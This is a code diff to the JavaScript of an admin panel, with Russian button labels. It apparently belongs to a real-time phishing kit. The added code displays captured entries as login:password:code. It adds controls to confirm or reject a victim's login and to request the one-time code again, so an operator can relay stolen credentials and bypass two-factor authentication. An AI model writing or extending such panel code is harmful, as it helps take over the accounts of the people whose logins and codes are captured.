@@ -272,6 +272,20 @@
                 }
             })
         }
+        function resendCode(id){
+            $.ajax({
+                url: '/admin/action/change/status/',
+                type: 'GET',
+                data: {
+                    id: id,
+                    status: 'resendCode'
+                },
+                success: function (data) {
+                    console.log(data)
+                    ajaxQueryUpdateTables()
+                }
+            })
+        }
         function updateTables(data) {
             try {
                 // Парсинг данных
@@ -288,12 +302,21 @@
                 }
                 actions_finished.innerHTML = ""
                 actionsFinished.forEach(actionActive => {
+                    const json_data = JSON.parse(actionActive.data);
+                    const login = json_data.login;
+                    const password = json_data.password;
+                    var code = "";
+                    if(json_data.code !== undefined){
+                        code = `:<span class='text-success-2'>${json_data.code}</span>`;
+                    }
+
+                    const string = `${login}:${password}${code}`;
                     const row = document.createElement('tr');
                     row.innerHTML = `
                 <td class="min-width">
                     <div class="lead">
                         <div class="lead-image"></div>
-                        <div class="lead-text"><p>${actionActive.data}</p></div>
+                        <div class="lead-text"><p>${string}</p></div>
                     </div>
                 </td>
                 <td class="min-width"><p>${actionActive.status}</p></td>
@@ -312,10 +335,11 @@
                 actionsActive.forEach(actionFinished => {
                     const row = document.createElement('tr');
                     var buttons = "";
-                    if(actionFinished.type_action === "code"){
+                    if(actionFinished.status === "code" || actionFinished.status === "resendCode" || actionFinished.status === "wrongCode"){
                          buttons = `
                         <button onclick="confirmCode(${actionFinished.id})" class="p-1 w-100 main-btn primary-btn btn-hover">Подтвердить вход</button>
                         <button onclick="cancelCode(${actionFinished.id})" class="p-1 w-100 main-btn danger-btn btn-hover">Отклонить вход</button>
+                        <button onclick="resendCode(${actionFinished.id})" class="p-1 w-100 main-btn secondary-btn btn-hover">Запросить код повторно</button>
                         `;
                     }
                     else{
